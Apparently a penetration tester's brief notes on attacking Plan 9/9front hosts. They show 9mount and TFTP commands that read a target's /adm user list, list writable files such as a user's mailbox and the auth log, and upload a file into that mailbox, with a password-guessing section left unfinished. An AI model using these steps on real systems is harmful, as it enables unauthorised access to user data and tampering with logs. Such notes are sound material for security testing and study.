
**Note on the "none" user.** <br />
This user generally "other" access to the filesystem. Most services run as this user, and it has several limitations (see http://fqa.9front.org/fqa7.html#7.3.3.1). So comprimised services would run in the context of this user. Access to "none" is not really considered a big issue, and in several cases, exposed services can generically access the filesystem. 

**File Server Access with 9mount**

    mkdir fsserve_9fs
    9mount 'tcp!192.168.9.3' fsserve_9fs
    # To unmount, 9umount fsserve_9fs
    cat fsserve_9fs/adm/user
    ...

    # find fsserve_9fs -writable
    fsserve_9fs/mail/box/glenda/mbox
    fsserve_9fs/mail/tmp
    fsserve_9fs/sys/log/auth

**TFTP Access**

    tftp> connect 192.168.9.3
    tftp> get /adm/users
    Received 182 bytes in 0.0 seconds
    tftp> put users /mail/box/glenda/mbox/users
    Sent 193 bytes in 0.1 seconds
    tftp> 

**Password Guessing**
TODO
